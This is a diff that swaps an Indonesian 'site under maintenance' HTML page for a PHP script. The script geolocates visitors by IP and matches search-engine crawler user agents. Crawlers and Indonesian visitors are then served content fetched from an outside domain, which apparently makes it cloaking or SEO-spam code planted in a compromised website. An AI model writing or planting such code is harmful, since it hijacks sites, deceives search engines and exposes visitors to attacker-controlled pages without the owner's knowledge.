@@ -1,52 +1,33 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <title>Situs Sedang Dalam Pemeliharaan</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            background: #f5f6fa;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            text-align: center;
-            color: #2f3640;
-        }
-        .container {
-            max-width: 600px;
-            padding: 20px;
-        }
-        h1 {
-            font-size: 2.5em;
-            color: #e84118;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 1.1em;
-            margin-top: 0;
-        }
-        .logo {
-            max-width: 150px;
-            margin-bottom: 20px;
-        }
-        @media (max-width: 600px) {
-            h1 {
-                font-size: 2em;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://i.imgur.com/oCkEbrA.png" alt="Maintenance" class="logo">
-        <h1>Situs Sedang Dalam Pemeliharaan</h1>
-        <p>Kami sedang melakukan perawatan sistem untuk peningkatan layanan.<br>Silakan kembali lagi beberapa saat lagi.</p>
-        <p>Terima kasih atas pengertiannya 🙏</p>
-    </div>
-</body>
-</html>
+<?php
+function getUserCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $url = "http://ip-api.com/json/{$ip}";
+    
+    $response = @file_get_contents($url);
+    if ($response) {
+        $data = json_decode($response, true);
+        return $data['countryCode'] ?? null;
+    }
+    return null;
+}
+
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+    
+    return preg_match($botchar, $user_agent);
+}
+
+$Zhyven = "https://amplaspride.xyz/landing/gazette/index.txt";
+
+if (is_bot()) {
+    echo @file_get_contents($Zhyven);
+    exit;
+}
+
+if (getUserCountry() === "ID") {
+    header("Content-Type: text/html; charset=UTF-8");
+    echo @file_get_contents($Zhyven);
+    exit();
+}
+?>
